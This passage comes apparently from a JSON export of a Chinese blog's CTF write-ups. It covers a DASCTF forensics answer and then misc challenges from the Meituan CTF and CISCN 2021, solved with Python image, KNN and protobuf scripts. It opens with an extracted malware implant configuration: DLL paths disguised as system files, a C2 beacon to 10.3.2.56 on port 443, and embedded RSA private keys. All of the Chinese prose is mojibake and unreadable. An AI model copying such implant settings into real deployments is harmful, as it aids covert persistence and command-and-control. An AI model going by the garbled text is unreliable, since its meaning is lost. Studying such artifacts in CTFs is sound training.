&lt;MAX_CHUNK_SIZE&gt;0&lt;/MAX_CHUNK_SIZE&gt; &lt;BATCH_EXECUTION_TIMEOUT&gt;123&lt;/BATCH_EXECUTION_TIMEOUT&gt; &lt;/TASKING&gt; &lt;INSTALL&gt; &lt;RESTART_SERVICE&gt;1&lt;/RESTART_SERVICE&gt; &lt;TARGET_FILE_NAME&gt;%SystemRoot %\\System32\\Microsoft\\Crypto\\RAS\\iprcache.dll&lt;/TARGET_FILE_NAME&gt; &lt;ORIGINAL_FILE_NAME&gt;%SystemRoot%\\System32\\iprtrmgr.dll&lt;/ORIGINAL_FILE_NAME&gt; &lt;DATA_FILE_NAME&gt;%SystemRoot%\\System32\\codeintegrity\\ras.cache&lt;/DATA_FILE_NAME&gt; &lt;/INSTALL&gt; &lt;UNINSTALL&gt; &lt;KILL_FILE_PATH&gt;&lt;/KILL_FILE_PATH&gt; &lt;DEAD_MAN_DELAY&gt;0&lt;/DEAD_MAN_DELAY&gt; &lt;BEACON_FAILURES&gt;0&lt;/BEACON_FAILURES&gt; &lt;DATE_AND_TIME&gt;&lt;/DATE_AND_TIME&gt; &lt;/UNINSTALL&gt; &lt;BEACON&gt; &lt;BOOT_DELAY&gt;0&lt;/BOOT_DELAY&gt; &lt;DOMAINS&gt;10.3.2.56&lt;/DOMAINS&gt; &lt;PORT&gt;443&lt;/PORT&gt; &lt;JITTER&gt;0&lt;/JITTER&gt; &lt;USER_AGENT_STRING&gt;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0)&lt;/USER_AGENT_STRING&gt; &lt;ACCEPT_STRING&gt;&lt;/ACCEPT_STRING&gt; &lt;INTERVAL&gt;5&lt;/INTERVAL&gt; &lt;TASKING_DELAY&gt;0&lt;/TASKING_DELAY&gt; &lt;PROXY_PORT&gt;0&lt;/PROXY_PORT&gt; &lt;HIBERNATION_DELAY&gt;0&lt;/HIBERNATION_DELAY&gt; &lt;ACCEPT_LANG_STRING&gt;&lt;/ACCEPT_LANG_STRING&gt; &lt;IE_PROXY_ADDRESS&gt;&lt;/IE_PROXY_ADDRESS&gt; &lt;URL_PATH&gt;/octopus/&lt;/URL_PATH&gt; &lt;ACCEPT_ENCODING_STRING&gt;&lt;/ACCEPT_ENCODING_STRING&gt; &lt;WPAD_PROXY_ADDRESS&gt;&lt;/WPAD_PROXY_ADDRESS&gt; &lt;/BEACON&gt; &lt;CLIENT_KEY&gt; &lt;PUBLIC_KEY&gt;-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4Ai nAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1 mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMT DicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90h Tgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCb hdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOI pQIDAQAB -----END PUBLIC KEY----- &lt;/PUBLIC_KEY&gt; &lt;PRIVATE_KEY&gt;-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzI A9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/H DtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2td INtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzCly AYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7 v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09f Tw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5 ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2 YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1J Gd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMU Ra592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje 0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9R pJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQyk AH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzg OOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPc QzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwL uCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ 9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQK kPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZa yPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG 7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbh ZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7 efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLK OLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiI F3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3 -----END RSA PRIVATE KEY----- &lt;/PRIVATE_KEY&gt; &lt;/CLIENT_KEY&gt; &lt;SERVER_KEY&gt; &lt;PUBLIC_KEY&gt;-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4Ai nAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1 mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMT DicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90h Tgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCb hdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOI pQIDAQAB -----END PUBLIC KEY----- &lt;/PUBLIC_KEY&gt; &lt;PRIVATE_KEY&gt;-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzI A9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/H DtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2td INtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzCly AYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7 v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09f Tw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5 ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2 YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1J Gd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMU Ra592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje 0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9R pJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQyk AH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzg OOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPc QzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwL uCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ 9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQK kPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZa yPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG 7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbh ZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7 efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLK OLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiI F3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3 -----END RSA PRIVATE KEY----- &lt;/PRIVATE_KEY&gt; &lt;/SERVER_KEY&gt; &lt;SOURCE&gt; &lt;FLAG?&gt;TheyWereBelieversInTheGoddess&lt;/FLAG?&gt; &lt;/SOURCE&gt; &lt;TARGET&gt; &lt;CHILD_ID&gt;0xABCD0064&lt;/CHILD_ID&gt; &lt;DYN_CONFIG_TYPE&gt;0&lt;/DYN_CONFIG_TYPE&gt; &lt;PARENT_ID&gt;flag&lt;/PARENT_ID&gt; &lt;/TARGET&gt; &lt;/ATHENA&gt; å¦å¤–è¿˜æå–å‡ºæ¥ä¸ª Top_secret.zipï¼Œè§£å‹å‡ºæ¥ä¸€ä¸ª client_secret.datï¼Œé‡Œé¢æ˜¯ &lt;data&gt; 6945004599188163993695415369835695903301224003136994252560594956191090963121611565339316899123749651980866032846579298200421747380583546633355992903073674181349057044030322829788264132202636849376954935277228938532451604402772829242424577058024238656161078439246537271516326863255516855631753446705292842229626286876548916801469642547513456705866784202623394305276451128865785358297012288872815722144655832856702699498675579782594166664458814522864775862036884859354259378908758433643337060342583622920263235497780709801069090899910257671959718315799533292405361650450010152269010240983236777594133358567962307235569 &lt;sign&gt; 2657375403899004421682435875591648757169751001935445937761677813563331237751296771655965799410203548200444843121899114276425174188686046977514392352233441829494629361400810323413751538449142557000621910082199277027187814332458889139635831754705831808451385798544850324418189973193940364270700678684371080465070928269782397410454121628205746311654719735981174781630012234885865191874665887323338400055601894791632973447395440378983992188376105785566869556895986983889219094640854379267584790389009829385657891279182819588524435817909919666674804622368593843455996806164859962400637898116212711639490474051288221345806 åº”è¯¥æ˜¯æ•°æ®å’Œç­¾åï¼Œæ‹¿å¯†é’¥å»è§£å¯†åº”è¯¥å°±å¥½äº†8 ï¼ˆåæ¥å»çœ‹å…¶ä»–æ¯”èµ›é¢˜ç›®äº†â€¦â€¦ å°ç»“è¿™ä¸ªæ¯”èµ›æ¯”è¾ƒåŸºç¡€ï¼Œé€‚åˆæ‹¿æ¥æ‘¸ğŸŸã€‚ éšä¾¿ç©ç©å°±å¥½äº†ï¼Œç›¸å¯¹è€Œè¨€è¿˜æ˜¯å¤§ä¸€ç‚¹çš„æ¯”èµ›é¢˜ç›®è´¨é‡æ›´é«˜ä¸€äº›ã€‚ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/05/30/CTF_2021DASCTF_May/"},{"title":"CTF | 2021 ç¾å›¢CTF Misc WriteUp","text":"å¼•è¨€ ç¾å›¢ç½‘ç»œå®‰å…¨é«˜æ ¡æŒ‘æˆ˜èµ› MT-CTF æ¯”èµ›æ—¶é—´: 2021-05-23 09:00 ~ 2021-05-23 21:00 æ¯”èµ›å®˜ç½‘: https://www.ichunqiu.com/meituan å‘¨æœ«æœ‰ä¸ªç¾å›¢ CTFï¼Œç„¶è€Œé‚£å¤©ç™½å¤©ä¸€ç›´åœ¨èµ¶ DDLï¼Œä¹ˆå¾—åŠæ³•ã€‚ è²Œä¼¼ä¹Ÿæ²¡å•¥å¸ˆå‚…æ‰“è¿™ä¸ªæ¯”èµ›ï¼Œæ„Ÿè§‰æƒ¨æƒ¨æ·¡æ·¡çš„ã€‚ ï¼ˆä¼°è®¡æ˜¯å†³èµ›å’Œå…¶ä»–æ¯”èµ›å†²çªçš„åŸå› å§ï¼Œæ‘Šæ‰‹ åˆ°äº†æ™šä¸Šé—®äº†ä¸‹åˆ«çš„å¸ˆå‚…ï¼Œè¯´ misc é¢˜æ²¡ä»€ä¹ˆäººåšå‡ºæ¥ï¼Œäºæ˜¯åƒå®Œé¥­å’±å°±æ¥çœ‹äº†çœ‹ã€‚ MiscDifferent_Puzzle è¿™äº›å›¾ç‰‡å¥½åƒä¸èƒ½ç”¨è›®åŠ›ã€‚ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª null.vhd è¿™æ˜¯ä¸€ä¸ª Windows çš„è™šæ‹Ÿç£ç›˜æ–‡ä»¶ï¼Œé¦–å…ˆè¿›è®¡ç®—æœºç®¡ç†-ç£ç›˜ç®¡ç†ï¼ŒæŠŠç›˜æŒ‚ä¸Šå»ã€‚ å¾—åˆ°ä¸€å †é»‘ç™½ç›¸é—´çš„å›¾ç‰‡ã€‚ ï¼ˆflag.txt æ˜¯ä¹‹åå¾—åˆ°çš„ï¼‰ å›¾ç‰‡é«˜åº¦éƒ½ä¸º100ï¼Œå®½åº¦æœ‰æ‰€åŒºåˆ«ã€‚ç›²çŒœæ˜¯ä¸€ç»´ç äº†ã€‚ å†™ä¸ªjioæœ¬åˆæˆä¸€ä¸‹ã€‚ å…¶å®å†™è„šæœ¬çš„æ—¶å€™è¿™é‡Œç›´æ¥æ˜¯ foremost å¯¼å‡ºæ¥çš„ï¼ŒæŒ‰ç…§ null.vhd é‡Œå­˜æ”¾çš„å…ˆåé¡ºåºã€‚ import PIL.Image as Image import os IMAGES_PATH = r'.\\Misc_Different_Puzzle\\null.vhd_outfile\\png\\\\' IMAGE_SAVE_PATH = r'.\\Misc_Different_Puzzle\\\\' image_names = [x for x in os.listdir(IMAGES_PATH) if x.endswith('.png')] to_image = Image.new('RGB', (300, 100)) x = 0 for img in image_names: from_image = Image.open(IMAGES_PATH + img) im_size = from_image.size to_image.paste(from_image, (x, 0)) x += im_size[0] to_image.show() to_image.save('decode.png') # EuO9&amp;cDH æ‰«ç å¾—åˆ° EuO9&amp;cDH ç„¶ååœ¨ flag.exe è¾“å…¥å°±èƒ½å¾—åˆ° flag.txt æ‰“å¼€å°±æ˜¯ flagã€‚ flag{af26d693-2de2-4b16-be49-d95e83a43f76} pixel Colorful pixel image. é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ Hint: do you know knn? è¿™é¢˜åšçš„æ—¶å€™å’±å°±çŒœæ˜¯ä¸æ˜¯è¦ç”¨æœºå™¨å­¦ä¹ æ¥åšä¸ªäºŒåˆ†ç±»ï¼Œæœç„¶åœ¨æ¯”èµ›ç»“æŸå‰åå‡ åˆ†é’Ÿæ”¾äº†ä¸ª hint è¯´æ˜¯ KNNï¼Œå®é”¤äº†ã€‚ ï¼ˆåªä¸è¿‡æ²¡æ—¶é—´åšäº†å€’æ˜¯äº† å¼€å±€ä¸€å¼ å›¾åŠ ä¸€ä¸ª txtã€‚ useful.txt ä¸€å…± 88209 è¡Œæ•°æ®ï¼Œæ­£å¥½æ˜¯ 297x297ã€‚ é‚£è¯´ä¸å®šæ‹¬å·é‡Œå°±æ˜¯ (R, G, B, A)ï¼ŒæŠŠå¯¹åº”çš„é¢œè‰²æ˜ å°„ä¸º 0 å’Œ 1ï¼Œé‚£å°±æ˜¯äºŒç»´ç äº†å§ã€‚ å†™ä¸ª jio æœ¬å¤åŸä¸€ä¸‹ã€‚ import re from PIL import Image with open('useful.txt', 'r', encoding='utf-8') as fin: s = fin.read() l = s.strip().split('\\n') # print(l) re_info = re.compile(r'(\\d) &lt;--- (\\(.*\\))') data = {} for x in l: info = re_info.search(x) data[info[2]] = info[1] # print(data) im = Image.open('pixel.png') print(im.size) # (297, 297) width = im.width height = im.height im2 = Image.new('RGBA', im.size) for j in range(height): for i in range(width): x = im.getpixel((i, j)) if data[str(x)] == '1': im2.putpixel((i, j), (0, 0, 0)) # else: # im2.putpixel((i, j), (255, 255, 255)) # im2.show() im2.save('decrypt2.png') å¾—åˆ°ä¸€å¼ äºŒç»´ç ã€‚ æ‰«æ QR å¾—åˆ° 8c8040579121e55ca4c58f9ï¼Œæ‹¿å»è§£å‹ã€‚ å¾—åˆ°è¿˜æ˜¯ä¸€å¼ åƒç´ ç‚¹æ··ä¹±çš„å›¾å’Œä¸€ä¸ªå’Œä¹‹å‰ç±»ä¼¼çš„æ–‡æœ¬ã€‚ ä½†æ˜¯è¿™æ¬¡çš„ RGBA å¹¶ä¸èƒ½å¯¹åº”ä¸Šã€‚ äºæ˜¯è€ƒè™‘æ˜¯ä¸æ˜¯è¦åšä¸ªäºŒåˆ†ç±»ï¼Œå°±æŠŠå››ç»´çš„ RGBA åˆ†ä¸ºä¸¤ç±»ï¼Œåˆ†åˆ«å¯¹åº”ç€é»‘å’Œç™½ä¸¤ç§ç»“æœã€‚ é¦–å…ˆç”¨æ‰€ç»™çš„æ•°æ®ä½œä¸ºè®­ç»ƒé›†å¾—åˆ°ä¸€ä¸ªæ¨¡å‹ï¼Œç„¶ååœ¨ flag.png ä¸Šä½œä¸ºæµ‹è¯•é›†è¿›è¡Œé¢„æµ‹ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªé»‘ç™½å›¾åƒï¼Œå¤§æ¦‚ç‡ä¹Ÿæ˜¯ QRç  æˆ–è€… æ¯”è¾ƒå®¹æ˜“è¾¨è¯†çš„å›¾å½¢ã€‚ å‚è€ƒ KNNåˆ†ç±»ç®—æ³•åŸç†åŠå®ç°åŠsklearnä¸­çš„ä½¿ç”¨æ–¹æ³•ï¼Œæœºå™¨å­¦ä¹ ä¹‹KNNæœ€é‚»è¿‘åˆ†ç±»ç®—æ³• å’±å°±æ•´ä¸ª KNN å‡ºæ¥å§ã€‚ è¿™é‡Œç›´æ¥ç”¨ sklearn é‡Œè‡ªå¸¦çš„ KNN æ¥å®ç°äº†ã€‚ # å¯¼å…¥ç”»å›¾å·¥å…· import matplotlib.pyplot as plt # å¯¼å…¥æ•°ç»„å·¥å…· import numpy as np # å¯¼å…¥æ•°æ®é›†ç”Ÿæˆå™¨ from sklearn.datasets import make_blobs # å¯¼å…¥KNN åˆ†ç±»å™¨ from sklearn.neighbors import KNeighborsClassifier # å¯¼å…¥æ•°æ®é›†æ‹†åˆ†å·¥å…· from sklearn.model_selection import train_test_split import re from PIL import Image with open('flag/hint.txt', 'r', encoding='utf-8') as fin: s = fin.read() l = s.strip().split('\\n') re_info = re.compile(r'(\\d) &lt;--- (\\(.*\\))') X = [] Y = [] for x in l: info = re_info.search(x) tmp1 = int(info[1]) tmp2 = eval(info[2]) X.append(tmp2) Y.append(tmp1) clf = KNeighborsClassifier() clf.fit(X, Y) im = Image.open('flag/flag.png') print(im.size) # (297, 297) width = im.width height = im.height im2 = Image.new('RGBA', im.size) for j in range(height): for i in range(width): x = im.getpixel((i, j)) res = clf.predict([x])[0] print(res) if res == 1: im2.putpixel((i, j), (0, 0, 0)) im2.show() im2.save('decrypt2.png') è™½ç„¶æœ‰ç‚¹æ¨¡ç³Šï¼Œä½†ç¼©å°ä¸€ç‚¹è¿˜æ˜¯èƒ½æ‰«å‡ºæ¥çš„ã€‚ flag{7he_p!xe1_wi7h_0ff5et} å°ç»“çœŸå°±é‡äº‹ä¸å†³ï¼Œæœºå™¨å­¦ä¹ å‘—ï¼ å…¶ä»–é¢˜å€’æ²¡æ€ä¹ˆçœ‹ï¼Œå’±åªæ˜¯ä½›ç³»åšåšç½¢äº†ã€‚ å”‰ï¼Œå–µå–µèœèœï¼Œçˆ¬èµ°äº†ã€‚ ï¼ˆæºœäº†æºœäº†å–µ","path":"2021/05/26/CTF_2021MeiTuan/"},{"title":"CTF | 2021 CISCNåˆèµ› Misc WriteUp","text":"å¼•è¨€ 2021 å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆ›æ–°å®è·µèƒ½åŠ›èµ› (CISCN) æ¯”èµ›æ—¶é—´: 2021-05-15 09:00 ~ 2021-05-16 09:00 æ¯”èµ›å®˜ç½‘: http://www.ciscn.cn/ ä¸€å¹´ä¸€åº¦çš„å›½èµ›åˆæ¥äº†ï¼Œè¿ç»­æ‰“ 24h å¤ªéš¾å—å•¦ï¼ ä»Šå¹´å›½èµ›æ­£å¥½ç¢°ä¸Šå’± ddlï¼Œæ‰“å®Œå›½èµ›åˆå»èµ¶ ddl å»äº†ï¼Œå¤ªéš¾é¡¶äº†ã€‚ äºæ˜¯ä¸€ç›´ä¹Ÿæ²¡æ—¶é—´æ¥æ•´ç† WriteUpï¼Œä»Šå¤©æ‘¸é±¼ï¼Œå°±æ¥å†™å‡ é“ misc é¢˜ç›®å¥½äº†ã€‚ ç¬¬ä¸€é˜¶æ®µtiny trafficæŠ“åŒ…æ–‡ä»¶å¯¼å‡º http å¯¹è±¡ 192.168.2.1 æ˜¯è·¯ç”±å™¨ï¼Œ192.168.2.193 æ˜¯å° NASï¼Œ5000ç«¯å£å¼€äº†ä¸ª python web æœåŠ¡ã€‚çœ‹ä¸Šå»æœ€åçš„æ˜¯ä¸ª rpc flag_wrapper å¯¼å‡ºå†…å®¹ï¼Œè§£å‹ä¹‹åå¾—åˆ° test å’Œ secret ç”¨ brotli è§£å‹ import brotli with open('test', 'rb') as fin: s = fin.read() x = brotli.decompress(s).decode() print(x) with open('secret', 'rb') as fin: s2 = fin.read() y = brotli.decompress(s2) print(y) with open('secret1', 'wb') as fout: fout.write(y) å‘ç° test æ˜¯ Protocol Buffzers å‚è€ƒ https://github.com/MonsterMeng92/protobuf/blob/master/docs/%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97(proto3).md syntax = \"proto3\"; message PBResponse { int32 code = 1; int64 flag_part_convert_to_hex_plz = 2; message data { string junk_data = 2; string flag_part = 1; } repeated data dataList = 3; int32 flag_part_plz_convert_to_hex = 4; string flag_last_part = 5; } message PBRequest { string cate_id = 1; int32 page = 2; int32 pageSize = 3; } é‡Œé¢å®šä¹‰äº†ä¼ è¾“ä¸­çš„æ ¼å¼ã€‚ è€Œsecret æ˜¯åºåˆ—åŒ–åçš„å¯†æ–‡ã€‚ å‚è€ƒ Protobufåè®®é€†å‘è§£æ-APPçˆ¬è™« å…ˆä¸‹è½½ Protobuf ç¼–è¯‘å™¨å’Œè°ƒç”¨ç¼–è¯‘å™¨çš„æ¥å£ï¼Œè¿™é‡Œç›´æ¥ç”¨ python äº† https://github.com/protocolbuffers/protobuf/releases/ è§£ç å¾—åˆ° 1: 200 2: 15100450 3 { 1 { 12: 0x35343332 } 2: \"7af2c\" } 3 { 1: \"7889b0\" 2: \"82bc0\" } 4: 16453958 5: \"d172a38dc\" å‘ç°å¹¶ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå…ˆç”Ÿæˆ python ä»£ç  protoc.exe test.proto --python_out=. ç„¶åå†™ä¸ªè„šæœ¬è§£ç  import test_pb2 r = test_pb2.PBResponse() with open('secret1', 'rb') as fin: s = fin.read() r.ParseFromString(s) print(r) å¾—åˆ° code: 200 flag_part_convert_to_hex_plz: 15100450 dataList { flag_part: \"e2345\" junk_data: \"7af2c\" } dataList { flag_part: \"7889b0\" junk_data: \"82bc0\" } flag_part_plz_convert_to_hex: 16453958 flag_last_part: \"d172a38dc\" æ‹¼æˆ flagï¼Œå…¶ä¸­ junk_data æ˜¯åƒåœ¾æ•°æ®ä¸è¦ CISCN{e66a22e23457889b0fb1146d172a38dc} running_pixelå¼€å±€ä¸€å¼ åŠ¨å›¾ ä¸€å…±æœ‰ 382 å¸§ï¼Œé€å¸§æŸ¥çœ‹ï¼Œå¯¼å‡ºæ¯ä¸€å¸§ã€‚ import os from PIL import Image, ImageSequence def parseGIF(gifname): # å°†gifè§£æä¸ºå›¾ç‰‡ # è¯»å–GIF im = Image.open(gifname) # GIFå›¾ç‰‡æµçš„è¿­ä»£å™¨ iter = ImageSequence.Iterator(im) # è·å–æ–‡ä»¶å file_name = gifname.split(\".\")[0] index = 1 # åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨ pic_dirct = \"imgs/{0}\".format(file_name) def mkdirlambda(x): return os.makedirs( x) if not os.path.exists(x) else True # ç›®å½•æ˜¯å¦å­˜åœ¨,ä¸å­˜åœ¨åˆ™åˆ›å»º mkdirlambda(pic_dirct) # éå†å›¾ç‰‡æµçš„æ¯ä¸€å¸§ for frame in iter: print(\"image %d: mode %s, size %s\" % (index, frame.mode, frame.size)) frame.save(\"imgs/%s/frame%d.png\" % (file_name, index)) index += 1 if __name__ == \"__main__\": parseGIF(\"running_pixel.gif\") éšæ„çœ‹å‰å‡ å¸§ï¼Œæ”¾å¤§æ¥çœ‹ï¼Œå‘ç°æœ‰ä¸ªåƒç´ ç‚¹åœ¨åŠ¨ã€‚ æ‰€ä»¥é¢˜ç›®åç§°ä¸­çš„è·‘åŠ¨çš„åƒç´ åº”è¯¥å°±æ˜¯è¿™ä¸ªäº†ã€‚ æå–å¾—åˆ°è¿™ä¸ªåƒç´ ç‚¹é¢œè‰² RGB ä¸º (233, 233, 233)ï¼Œè€ŒèƒŒæ™¯è‰²æ˜¯ (247, 247, 247) å¦å¤–å‘ç°æ¯éš”ä¸€å®šå¸§æ•°ï¼Œè¿™ä¸ªåƒç´ ç‚¹ä¼šæ¶ˆå¤±ï¼Œç„¶ååœ¨å¦ä¸€ä¸ªåœ°æ–¹å‡ºç°ã€‚ äºæ˜¯å†™ä¸ªè„šæœ¬è·‘æ‰€æœ‰çš„å¸§ï¼ŒæŠŠè¿™ä¸ªåƒç´ ç‚¹çš„è½¨è¿¹ç”»å‡ºæ¥ï¼Œæ¯æ¶ˆå¤±ä¸€æ¬¡ä¿å­˜ä¸€å¼ å›¾ç‰‡ã€‚ \"\"\" MiaoTony \"\"\" import cv2 import os from PIL import Image, ImageOps import numpy as np im2 = Image.new('RGB', (400, 400)) last_cnt = 0 # list(os.walk('imgs'))[0][2] for cnt in range(1, 383): img_name = f'imgs/frame{cnt}.png' im = Image.open(img_name) rgb_im = im.convert('RGB') # print(rgb_im.size) # (400, 400) width = rgb_im.width height = rgb_im.height for j in range(height): for i in range(width): r, g, b = rgb_im.getpixel((i, j)) if (r, g, b) == (233, 233, 233): # print('cnt', cnt) # print(i, j) if cnt != last_cnt + 1: print(cnt) im2.save(f'cnt{cnt}.png') im2.putpixel((j, i), (255, 255, 255)) last_cnt = cnt im2.show() im2.save('final.png') æœ€åçš„å›¾æ˜¯è¿™æ ·çš„ã€‚ æ‰‹åŠ¨æŒ‰é¡ºåºæŠŠå‡ºæ¥çš„å›¾ç‰‡å„ä¸ªå­—æ¯æå–å‡ºæ¥ã€‚ ï¼ˆå…¶å®æ›´å¥½çš„æ€è·¯æ˜¯æ¯æ¬¡åƒç´ ç‚¹æ¶ˆå¤±çš„æ—¶å€™æ–°å»ºä¸€å¼ å›¾çš„â€¦â€¦çœ‹çš„è¦çœ¼çäº† å‡ºæ¥æ˜¯ä¸ª UUID çš„æ ¼å¼ã€‚ 12504D0F-9DE1-4B00-87A5-A5FDD0986A00 è£¹ä¸Š CISCNï¼Œç„¶åå‘ç° 19:00ï¼Œè‰ï¼Œäº¤ä¸ä¸Šå»äº†ï¼ å¿ƒæ€ç‚¸äº†ï¼ï¼ï¼ ï¼ˆåæ¥çœ‹å¤§ä½¬ wp è¯´è¿™é‡Œè¿˜è¦è½¬æˆå°å†™å†äº¤ä¸Šå» CISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00} ç¬¬äºŒé˜¶æ®µéš”ç©ºä¼ è¯ é¢˜ç›®æè¿°ï¼šAlice å’Œ Bob è¿›è¡Œéš”ç©ºä¼ è¯çš„æ—¶å€™è¢«æˆ‘â€œå·å¬â€åˆ°äº†ï¼Œä½ 